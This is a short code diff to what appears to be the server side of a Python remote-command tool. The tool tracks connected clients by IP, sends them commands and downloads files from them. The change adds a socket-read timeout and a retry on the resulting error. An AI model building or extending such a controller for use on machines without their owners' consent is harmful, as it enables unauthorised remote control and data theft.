@@ -4,6 +4,7 @@ import time
 import json
 import base64
 import requests
+import select
 from queue import Queue
 
 class Con_Stor():
@@ -39,6 +40,10 @@ class Con_Stor():
 
     def json_receive(self):
         json_data = "" 
+
+        ready = select.select([self.client_socket_object], [], [], 1)
+        if not ready[0]:
+            return "[+] ERROR - Error during command execution"
         while True:
             try:
                 page = self.client_socket_object.recv(1024)
@@ -114,6 +119,7 @@ def execute_command(ip, command):
         obj = ACTIVE_CONNECTIONS[ip]
     except:
         return "Connection Pipe Broken"
+    
     command = command.split()
 
     if command[0] == "exit":
@@ -141,4 +147,6 @@ def execute_command(ip, command):
         return "File Downloaded"
     else:
         #RESPONSE_DIRECTORY[id] = response
+        if response == "[+] ERROR - Error during command execution":
+            response = obj.json_receive()
         return response
